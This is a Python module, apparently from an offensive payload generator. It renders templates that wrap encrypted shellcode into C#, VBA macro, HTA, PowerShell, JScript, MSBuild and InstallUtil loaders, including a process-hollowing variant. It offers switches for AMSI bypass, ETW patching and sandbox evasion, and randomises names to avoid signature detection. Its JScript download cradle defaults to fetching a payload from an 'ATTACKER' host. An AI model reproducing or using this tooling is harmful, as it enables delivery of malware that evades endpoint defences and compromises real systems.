import random
import string
from pathlib import Path
from jinja2 import Environment, FileSystemLoader

from . import snippets

# Path to the root templates directory
TMPL_DIR = Path(__file__).parent.parent / 'templates'

# Initialize Jinja2 environment
env = Environment(loader=FileSystemLoader(str(TMPL_DIR)))


# ---------------------------------------------------------------------------
# Byte formatters per target language
# ---------------------------------------------------------------------------

def fmt_cs(data):
    """0xfc,0x48,0x83,..."""
    return ','.join(f'0x{b:02x}' for b in data)


def fmt_vba(data):
    """232,130,0,...  with VBA line continuation every 50 values."""
    vals = [str(b) for b in data]
    lines = []
    for i in range(0, len(vals), 50):
        lines.append(','.join(vals[i:i + 50]))
    return ' _\n'.join(lines)


def fmt_ps(data):
    """0xfc,0x48,0x83,..."""
    return ','.join(f'0x{b:02x}' for b in data)


# ---------------------------------------------------------------------------
# Random name generation (avoids static signatures)
# ---------------------------------------------------------------------------

def _rand_name(prefix='', length=8):
    chars = string.ascii_letters
    return prefix + ''.join(random.choice(chars) for _ in range(length))


# ---------------------------------------------------------------------------
# VBA AMSI declare lines (only needed when --amsi is used with VBA)
# ---------------------------------------------------------------------------

_VBA_AMSI_DECLARES = '''Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLib As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hMod As LongPtr, ByVal lpProc As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSz As LongPtr, ByVal flNew As Long, lpflOld As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByRef src As Any, ByVal sz As Long)'''


# ---------------------------------------------------------------------------
# Template mapping
# ---------------------------------------------------------------------------

# format name -> (template file, language family)
FORMATS = {
    'exe':         ('cs_runner.cs',   'cs'),
    'hollow':      ('cs_hollow.cs',   'cs'),
    'dll':         ('cs_dll.cs',      'cs'),
    'macro':       ('vba_macro.vba',  'vba'),
    'hta':         ('hta_runner.hta', 'vba'),  # HTA uses VBScript, same snippets as VBA
    'ps1':         ('ps_runner.ps1',  'ps'),
    'js':          ('jscript.js',     'js'),
    'msbuild':     ('msbuild.csproj', 'cs'),
    'installutil': ('installutil.cs', 'cs'),
}


def render(fmt, encrypted, meta_chain, amsi=False, etw=False, sandbox=False, payload_url=''):
    """Render a payload template with encrypted shellcode and options.
    Returns the rendered source code as a string."""

    if fmt not in FORMATS:
        raise ValueError(f'unknown format: {fmt}')

    tmpl_file, lang = FORMATS[fmt]
    template = env.get_template(tmpl_file)

    ns = _rand_name('Mf')
    cls = _rand_name('R')

    # jscript is special -- it's a download cradle, no encryption
    if fmt == 'js':
        return template.render(payload_url=payload_url or 'http://ATTACKER/payload.ps1')

    # build decryption chain for this language
    etw_block = ''
    if lang == 'cs':
        decrypt_block = snippets.build_chain_cs(meta_chain)
        sc_bytes = fmt_cs(encrypted)
        amsi_block = snippets.get_amsi_cs(amsi)
        amsi_imports = snippets.get_amsi_imports_cs(amsi or etw)
        sandbox_block = snippets.get_sandbox_cs(sandbox)
        etw_block = snippets.get_etw_cs(etw)
    elif lang == 'vba':
        decrypt_block = snippets.build_chain_vba(meta_chain)
        sc_bytes = fmt_vba(encrypted)
        amsi_block = snippets.get_amsi_vba(amsi)
        amsi_imports = ''
        sandbox_block = snippets.get_sandbox_vba(sandbox)
    elif lang == 'ps':
        decrypt_block = snippets.build_chain_ps(meta_chain)
        sc_bytes = fmt_ps(encrypted)
        amsi_block = snippets.get_amsi_ps(amsi)
        amsi_imports = ''
        sandbox_block = ''
        etw_block = snippets.get_etw_ps(etw)
    else:
        decrypt_block = ''
        sc_bytes = ''
        amsi_block = ''
        amsi_imports = ''
        sandbox_block = ''

    # if no encryption was applied, shellcode goes directly into 'buf'
    no_encryption = not meta_chain or meta_chain[0]['method'] == 'none'
    is_encrypted = not no_encryption

    # crypto using statement for C# (only when AES is in the chain)
    crypto_using = ''
    if lang == 'cs' and snippets.needs_aes_imports(meta_chain):
        crypto_using = 'using System.Security.Cryptography;'

    # msbuild has its own crypto using slot
    msbuild_crypto = ''
    if fmt == 'msbuild' and snippets.needs_aes_imports(meta_chain):
        msbuild_crypto = '<Using Namespace="System.Security.Cryptography" />'

    # VBA AMSI declare lines
    vba_amsi_declares = _VBA_AMSI_DECLARES if (amsi and lang == 'vba') else ''

    context = {
        'namespace': ns,
        'classname': cls,
        'shellcode': sc_bytes,
        'decrypt_block': decrypt_block,
        'amsi_block': amsi_block,
        'amsi_imports': amsi_imports,
        'sandbox_block': sandbox_block,
        'etw_block': etw_block,
        'crypto_using': crypto_using,
        'msbuild_crypto_using': msbuild_crypto,
        'vba_amsi_declares': vba_amsi_declares,
        'payload_url': payload_url or '',
        'is_encrypted': is_encrypted,
        'lang': lang,
    }

    out = template.render(**context)

    # clean up empty lines
    lines = out.split('\n')
    cleaned = []
    for line in lines:
        stripped = line.strip()
        if stripped == '' and cleaned and cleaned[-1].strip() == '':
            continue
        cleaned.append(line)
    return '\n'.join(cleaned)
